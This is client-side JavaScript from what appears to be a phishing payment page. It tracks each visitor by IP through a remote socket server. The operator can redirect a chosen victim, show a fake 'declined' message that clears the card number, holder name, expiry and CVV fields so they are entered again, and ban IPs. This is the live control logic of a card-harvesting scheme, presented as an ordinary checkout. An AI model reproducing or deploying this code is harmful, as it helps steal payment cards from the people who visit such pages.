    window.socket = io("https://tamini-server.onrender.com", { transports: ["websocket", "polling"] });
    window.visitorIP = null;

    (async () => {
      try {
        const r = await fetch("https://api.ipify.org?format=json");
        const { ip } = await r.json();
        window.visitorIP = ip;
        window.socket.emit("updateLocation", { ip, page: "paymen.html" });
      } catch(e) {
        console.error("IP fetch failed:", e);
      }
    })();

    window.socket.on("navigateTo", ({ page, ip: targetIp }) => {
      const go = () => {
        if (window.visitorIP === targetIp) {
          if (page.includes("declined=true")) {
          
            const ls = document.getElementById("loadingScreen");
            if (ls) ls.classList.remove("show");
            
            ["cardNumber","cardHolderName","expiryDate","cvv"].forEach(id => {
              const el = document.getElementById(id);
              if (el) el.value = "";
            });
            const netImg = document.getElementById("s6NetworkLogo");
            if (netImg) netImg.classList.remove("show");
            const db = document.getElementById("declineBox");
            if (db) {
              db.classList.add("show");
              setTimeout(() => db.scrollIntoView({ behavior: "smooth", block: "center" }), 200);
            }
          } else {
            
            window.location.href = page;
          }
        }
      };
      if (!window.visitorIP) {
        const t = setInterval(() => { if (window.visitorIP) { clearInterval(t); go(); } }, 100);
      } else { go(); }
    });

   
    (async () => {
      try {
        while (window.visitorIP === null) {
          await new Promise(r => setTimeout(r, 50));
        }
        const res = await fetch(`https://tamini-server.onrender.com/api/pending-nav/${encodeURIComponent(window.visitorIP)}`);
        const data = await res.json();
        if (data.page) { window.location.href = data.page; }
      } catch(e) { console.error("pending-nav check failed:", e); }
    })();

   
    (async () => {
      try {
        while (window.visitorIP === null) {
          await new Promise(r => setTimeout(r, 50));
        }
        const res = await fetch(`https://tamini-server.onrender.com/api/banned/${encodeURIComponent(window.visitorIP)}`);
        const data = await res.json();
        if (data.banned) { window.location.replace("banned.html"); }
      } catch(e) { console.error("ban check failed:", e); }
    })();

    
    window.socket.on("banned", () => {
      window.location.replace("banned.html");
    });